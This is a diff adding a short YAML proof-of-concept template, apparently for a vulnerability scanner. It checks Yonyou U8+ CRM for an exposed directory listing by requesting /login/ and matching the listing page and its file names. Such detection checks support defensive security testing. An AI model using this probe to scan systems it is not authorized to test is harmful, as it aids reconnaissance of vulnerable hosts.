@@ -1,0 +1,14 @@
+id: poc-yaml-yongyou-U8+-crm-directory-traversal
+info:
+  name: 用友 U8+ CRM 目录遍历漏洞
+  severity: medium
+  tags:
+  - 目录遍历
+  finger: 用友U8+CRM
+requests:
+- method: GET
+  path: /login/
+  expression: status_code == 200 && contains(body,"changepswd.php") && contains(body,"Index
+    of /login") && contains(body,"login.php")
+variables: {}
+transport: http
